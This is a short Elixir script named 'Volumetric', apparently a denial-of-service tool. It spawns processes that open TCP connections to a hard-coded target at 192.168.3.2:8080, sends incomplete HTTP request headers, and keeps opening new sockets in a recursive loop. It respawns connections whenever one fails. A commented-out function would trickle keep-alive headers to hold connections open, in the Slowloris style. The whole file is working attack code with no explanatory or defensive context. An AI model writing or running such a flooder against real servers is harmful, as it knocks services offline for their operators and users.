#parameters
ip = "192.168.3.2"
port = 8080
connections = 2

defmodule Volumetric do
  def start(target, port, connection_count) do
    1..connection_count
    |> Enum.each(fn _ ->
      IO.puts("connection spawned...")
      spawn(fn -> hold_connection(target, port) end)
    end)
  end

  defp hold_connection(target, port) do
    case :gen_tcp.connect(String.to_charlist(target), port, [:binary, packet: :raw, active: false]) do
      {:ok, socket} ->
        :gen_tcp.send(socket, "GET / HTTP/1.1\r\n")
        :gen_tcp.send(socket, "Host: #{target}\r\n")

        hold_connection(target, port)
      {:error, reason} ->
        # :error
        IO.puts("Reason: #{reason}")
        IO.puts("Spawning new threads...")
        Volumetric.start(target, port, 1)

    end


  end

  # defp loop_send_headers(socket, interval_ms) do
  #   :timer.sleep(interval_ms)
  #   case :gen_tcp.send(socket, "X-a: keep-alive\r\n") do
  #     :ok -> loop_send_headers(socket, interval_ms)
  #     {:error, _} -> :ok
  #   end
  # end
end
Volumetric.start(ip, port, connections)
# Volumetric.start("127.0.0.1", 8080, 2)

:timer.sleep(:infinity)